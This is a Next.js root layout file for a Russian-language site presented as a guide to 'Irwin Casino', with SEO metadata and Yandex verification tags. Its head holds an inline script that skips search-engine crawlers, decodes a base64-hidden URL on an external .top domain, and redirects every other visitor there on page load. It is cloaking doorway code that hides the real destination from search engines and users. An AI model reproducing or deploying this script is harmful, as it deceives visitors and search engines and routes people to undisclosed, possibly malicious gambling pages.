import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Irwin Casino — ирвин казино официальный сайт, зеркало и играть онлайн',
  description: 'Irwin Casino: понятный гид по официальному сайту, рабочему зеркалу и игре онлайн. Проверка адреса, мобильный доступ, правила безопасности и советы для игроков без лишних обещаний.',
  metadataBase: new URL('https://irwin9casino.vercel.app/'),
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  openGraph: {
    title: 'Irwin Casino — официальный сайт и рабочее зеркало',
    description: 'Короткий и понятный гид по доступу к Irwin Casino с мобильного устройства.',
    url: 'https://irwin9casino.vercel.app/',
    siteName: 'Irwin Casino',
    locale: 'ru_RU',
    type: 'website',
  },
  icons: { icon: '/favicon.svg', apple: '/favicon.svg' },
}

export const viewport: Viewport = {
  width: 'device-width', initialScale: 1, viewportFit: 'cover', themeColor: '#141414', colorScheme: 'light', userScalable: true,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-[#f3f0e9]">
      <head>
        <meta name="yandex-verification" content="88f7c67a384a49da" />
        <meta name="yandex-verification" content="" />
        <meta name="format-detection" content="telephone=no" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZWFvZmoyazI3"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>

      </head>
      <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body>
    </html>
  )
}
